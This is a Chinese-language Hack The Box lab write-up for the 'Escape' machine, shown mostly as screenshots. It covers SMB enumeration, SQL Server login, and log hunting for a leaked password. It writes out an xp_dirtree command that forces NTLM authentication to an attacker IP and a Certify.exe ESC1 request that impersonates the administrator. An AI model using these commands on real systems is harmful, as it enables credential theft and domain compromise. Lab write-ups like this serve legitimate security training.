+++
ShowToc = true
TocOpen = true
title = '0X023 Escape'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE240fca89a47034f53abe9633404aa2bdimage.png)

![](/htb_img/WEBRESOURCE879f954d7fb881ade1d7bc17e7aac2e4image.png)

![](/htb_img/WEBRESOURCEf7aa426ecdb6ae1e15d35397b13941d4image.png)

# 获取立足点

值得关注的端口：389，445，1433，5985

![](/htb_img/WEBRESOURCE86f4b2d645b49a6f29f43ef449edc719image.png)

smb发现这个东西：

![](/htb_img/WEBRESOURCE622d9e2dcc45ef56d812810e9a62425eimage.png)

发现sqlserver登录方式：

![](/htb_img/WEBRESOURCEf6f86c814237304e9ae50205f8812cadimage.png)

连接成功：

![](/htb_img/WEBRESOURCEfcf3e587b7fdca0e5f97b907476c477fimage.png)

看了一圈儿，确实没东西了：

![](/htb_img/WEBRESOURCE93c53ee64eda152b3a85dd37a474591cimage.png)

最后无奈看了wp，属实没想到，sqlserver也能玩儿relay：

![](/htb_img/WEBRESOURCEb4410d8a0f9b2db975f55218ef5b7042image.png)

EXEC MASTER.sys.xp_dirtree '\10.10.16.12\test', 1, 1

![](/htb_img/WEBRESOURCE11226968d518189f35c30b446f9d04c1image.png)

很快就破解了：

![](/htb_img/WEBRESOURCE2a5fbd741986f884e6e00480ac611c41image.png)

可以直接登录winrm:

![](/htb_img/WEBRESOURCE2527100e2c4da7b9bddff00d8ba82ec6image.png)

![](/htb_img/WEBRESOURCEe72515d5df9229358952cef420e422dcimage.png)

bloodhound:

无法分析出可用的路径：

![](/htb_img/WEBRESOURCEed4a4ebd002b6571a549c3bb96629870image.png)

winpeass也没能发现什么有用的东西，看了一下wp，呐应该是思路的缺失了，查看sqlserver的日志文件：

![](/htb_img/WEBRESOURCE3444a296c8840c0c82d03c468cf4a537image.png)

咋说呢，错误日志一般是不会记录错误密码的，但是会记录错误用户：

感觉还是有点缺乏想象力，这里应该是模仿用户输入错误了密码为用户名，导致日志被记录：

![](/htb_img/WEBRESOURCEec28db1f6252dfbd0177e8309ebf054fimage.png)

是远程组的：

![](/htb_img/WEBRESOURCEd7a2ddc8d65b75c8cd4d35e0720513e6image.png)

登录看看：

![](/htb_img/WEBRESOURCE48bee9d46c173643897e2ae0c40d3868image.png)

很好，bloodhound有局限，ADCS的相关内容其实也有了解，但是没想到这一点：

![](/htb_img/WEBRESOURCEc57b1c3d18a5c33ea7055cb65593cbcbimage.png)

ESC1：

.\Certify.exe request /ca:sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

![](/htb_img/WEBRESOURCEb1b4d27cb784d2bbdaac9777449b7e84image.png)

复制出来，提取：

![](/htb_img/WEBRESOURCE2ce912c75e9c2ad1492c36814f69d5f8image.png)

获取hash:

![](/htb_img/WEBRESOURCEa4c4c2c72d448170fb9471b4334fcecbimage.png)